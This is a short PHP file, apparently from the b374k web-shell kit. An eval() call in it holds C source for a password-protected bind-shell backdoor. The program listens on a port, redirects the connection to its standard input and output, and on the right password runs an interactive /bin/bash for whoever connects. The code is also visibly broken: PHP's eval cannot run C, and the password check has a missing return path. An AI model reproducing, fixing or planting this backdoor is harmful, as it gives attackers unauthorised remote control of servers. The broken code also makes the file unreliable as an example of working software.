<?php

eval("#include <stdio.h>\r\n#include <string.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <errno.h>\r\nint main(argc,argv)\r\nint argc;\r\nchar **argv;\r\n{  \r\n int sockfd, newfd;\r\n char buf[30];\r\n struct sockaddr_in remote;\r\n if(fork() == 0) { \r\n remote.sin_family = AF_INET;\r\n remote.sin_port = htons(atoi(argv[1]));\r\n remote.sin_addr.s_addr = htonl(INADDR_ANY); \r\n sockfd = socket(AF_INET,SOCK_STREAM,0);\r\n if(!sockfd) perror(\"socket error\");\r\n bind(sockfd, (struct sockaddr *)&remote, 0x10);\r\n listen(sockfd, 5);\r\n while(1)\r\n  {\r\n   newfd=accept(sockfd,0,0);\r\n   dup2(newfd,0);\r\n   dup2(newfd,1);\r\n   dup2(newfd,2);\r\n   write(newfd,\"Password:\",10);\r\n   read(newfd,buf,sizeof(buf));\r\n   if (!chpass(argv[2],buf))\r\n   system(\"echo welcome to b374k shell && /bin/bash -i\");\r\n   else\r\n   fprintf(stderr,\"Sorry\");\r\n   close(newfd);\r\n  }\r\n }\r\n}\r\nint chpass(char *base, char *entered) {\r\nint i;\r\nfor(i=0;i<strlen(entered);i++) \r\n{\r\nif(entered[i] == '\\n')\r\nentered[i] = '\\0'; \r\nif(entered[i] == '\\r')\r\nentered[i] = '\\0';\r\n}\r\nif (!strcmp(base,entered))\r\nreturn 0;\r\n}");
